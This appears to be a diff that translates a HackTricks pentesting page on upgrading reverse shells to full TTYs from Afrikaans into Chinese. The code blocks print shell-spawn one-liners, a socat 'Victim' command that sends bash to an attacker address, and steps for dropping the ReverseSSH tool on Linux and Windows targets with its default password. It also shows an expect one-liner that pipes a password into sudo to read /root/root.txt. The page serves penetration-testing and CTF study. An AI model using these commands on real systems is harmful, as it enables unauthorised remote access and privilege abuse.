@@ -1,29 +1,29 @@
-# Volle TTYs
+# Full TTYs
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Verdiep jou kundigheid in **Mobiele Sekuriteit** met 8kSec Akademie. Meester iOS en Android sekuriteit deur ons self-gebaseerde kursusse en kry gesertifiseer:
+通过 8kSec 学院深化您在 **移动安全** 方面的专业知识。通过我们的自学课程掌握 iOS 和 Android 安全并获得认证：
 
 {% embed url="https://academy.8ksec.io/" %}
 
-## Volle TTY
+## Full TTY
 
-Let daarop dat die skulp wat jy in die `SHELL` veranderlike stel **moet** wees **lys binne** _**/etc/shells**_ of `Die waarde vir die SHELL veranderlike is nie in die /etc/shells lêer gevind nie. Hierdie voorval is gerapporteer`. Let ook daarop dat die volgende snippette slegs in bash werk. As jy in 'n zsh is, verander na 'n bash voordat jy die skulp verkry deur `bash` te loop.
+请注意，您在 `SHELL` 变量中设置的 shell **必须** 在 _**/etc/shells**_ 中 **列出**，否则会出现 `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`。另外，请注意，以下代码片段仅在 bash 中有效。如果您在 zsh 中，请在通过运行 `bash` 获取 shell 之前切换到 bash。
 
 #### Python
 
@@ -36,10 +36,10 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 {% endcode %}
 
 {% hint style="info" %}
-Jy kan die **aantal** **rye** en **kolomme** kry deur **`stty -a`** uit te voer
+您可以通过执行 **`stty -a`** 获取 **行** 和 **列** 的 **数量**
 {% endhint %}
 
-#### script
+#### 脚本
 
 {% code overflow="wrap" %}
 ```bash
@@ -56,7 +56,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 #Victim:
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
-### **Spawn shells**
+### **生成shell**
 
 * `python -c 'import pty; pty.spawn("/bin/sh")'`
 * `echo os.system('/bin/bash')`
@@ -73,11 +73,11 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-'n gerieflike manier vir **interaktiewe skulp toegang**, sowel as **lêer oordragte** en **poort forwarding**, is om die staties-gekoppelde ssh bediener [ReverseSSH](https://github.com/Fahrj/reverse-ssh) op die teiken te laat val.
+一种方便的**交互式shell访问**、**文件传输**和**端口转发**的方法是将静态链接的ssh服务器[ReverseSSH](https://github.com/Fahrj/reverse-ssh)放置到目标上。
 
-Hieronder is 'n voorbeeld vir `x86` met upx-gecomprimeerde binêre. Vir ander binêre, kyk [vrygawes bladsy](https://github.com/Fahrj/reverse-ssh/releases/latest/).
+以下是针对`x86`的示例，使用upx压缩的二进制文件。有关其他二进制文件，请查看[发布页面](https://github.com/Fahrj/reverse-ssh/releases/latest/)。
 
-1. Berei plaaslik voor om die ssh poort forwarding versoek te vang:
+1. 在本地准备以捕获ssh端口转发请求：
 
 {% code overflow="wrap" %}
 ```bash
@@ -88,7 +88,7 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 ```
 {% endcode %}
 
-* (2a) Linux teiken:
+* (2a) Linux 目标：
 
 {% code overflow="wrap" %}
 ```bash
@@ -99,7 +99,7 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 ```
 {% endcode %}
 
-* (2b) Windows 10 teiken (vir vroeëre weergawes, kyk na [projek leesmy] (https://github.com/Fahrj/reverse-ssh#features)):
+* (2b) Windows 10 目标（对于早期版本，请查看 [project readme](https://github.com/Fahrj/reverse-ssh#features)）:
 
 {% code overflow="wrap" %}
 ```bash
@@ -110,7 +110,7 @@ reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
 {% endcode %}
 
-* As die ReverseSSH poort forwarding versoek suksesvol was, behoort jy nou in staat te wees om in te log met die standaard wagwoord `letmeinbrudipls` in die konteks van die gebruiker wat `reverse-ssh(.exe)` uitvoer:
+* 如果 ReverseSSH 端口转发请求成功，您现在应该能够使用默认密码 `letmeinbrudipls` 登录，前提是以运行 `reverse-ssh(.exe)` 的用户身份：
 ```bash
 # Interactive shell access
 ssh -p 8888 127.0.0.1
@@ -120,33 +120,33 @@ sftp -P 8888 127.0.0.1
 ```
 ## Penelope
 
-[Penelope](https://github.com/brightio/penelope) werk outomaties Linux reverse shells op na TTY, hanteer die terminalgrootte, log alles en nog baie meer. Dit bied ook readline-ondersteuning vir Windows shells.
+[Penelope](https://github.com/brightio/penelope) 自动将 Linux 反向 shell 升级为 TTY，处理终端大小，记录所有内容等等。它还为 Windows shell 提供 readline 支持。
 
 ![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
 
-## Geen TTY
+## No TTY
 
-As jy om een of ander rede nie 'n volle TTY kan verkry nie, kan jy **nog steeds met programme interaksie hê** wat gebruikersinvoer verwag. In die volgende voorbeeld word die wagwoord aan `sudo` gegee om 'n lêer te lees:
+如果由于某种原因您无法获得完整的 TTY，您**仍然可以与期望用户输入的程序交互**。在以下示例中，密码被传递给 `sudo` 以读取文件：
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
 <figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Verdiep jou kundigheid in **Mobiele Sekuriteit** met 8kSec Akademie. Meester iOS en Android sekuriteit deur ons self-gebaseerde kursusse en kry gesertifiseer:
+通过8kSec Academy深化您在**移动安全**方面的专业知识。通过我们的自学课程掌握iOS和Android安全并获得认证：
 
 {% embed url="https://academy.8ksec.io/" %}
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践AWS黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践GCP黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**上关注我们。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub库提交PR分享黑客技巧。
 
 </details>
 {% endhint %}
